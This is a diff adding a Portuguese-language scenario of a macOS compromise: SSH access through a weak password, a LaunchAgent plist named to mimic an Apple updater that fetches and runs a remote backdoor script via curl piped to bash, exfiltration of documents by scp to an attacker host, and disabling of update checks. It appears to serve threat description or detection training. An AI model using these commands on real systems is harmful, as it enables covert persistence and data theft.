@@ -1,0 +1,30 @@
+Em um ambiente macOS alvo, o atacante obteve acesso inicial por meio de um serviço SSH exposto com senha fraca. Após autenticação bem-sucedida como um usuário padrão, iniciou-se o processo de persistência via modificação de arquivos plist (Property List), utilizados pelo sistema para agendar e gerenciar serviços e processos.
+
+O atacante criou um novo arquivo de configuração em ~/Library/LaunchAgents/com.apple.update.plist com o seguinte conteúdo:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.apple.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>curl http://maliciousserver/backdoor.sh | bash</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+
+Esse arquivo foi então carregado utilizando o comando:
+
+launchctl load ~/Library/LaunchAgents/com.apple.update.plist
+
+O script remoto (backdoor.sh) criava um agente de conexão reversa com o C2 do atacante, que era acionado sempre que o usuário logava no sistema. A persistência passou despercebida devido à semelhança do nome do serviço com serviços legítimos da Apple.
+
+O atacante utilizou o acesso para exfiltrar documentos com comandos como scp ~/Documents/*.docx attacker@malicioushost:~/loot/, e desativou notificações de segurança com:
+
+defaults write com.apple.SoftwareUpdate AutomaticCheckEnabled -bool false
